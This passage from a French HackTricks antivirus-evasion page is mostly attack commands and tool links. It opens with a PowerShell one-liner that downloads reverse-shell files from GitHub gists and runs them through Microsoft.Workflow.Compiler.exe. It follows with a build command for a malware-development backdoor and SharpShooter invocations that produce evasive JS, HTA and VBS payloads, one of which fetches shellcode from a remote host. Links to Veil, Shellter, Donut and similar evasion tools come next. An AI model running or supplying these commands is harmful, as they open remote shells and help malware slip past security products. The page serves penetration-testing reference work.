powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
### C++

La liste des obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
```markdown
[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)

Merlin, Empire, Puppy, SalsaTools https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/

[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)

https://github.com/l0ss/Grouper2

{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}

{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}

### Autres outils
```
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Plus

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
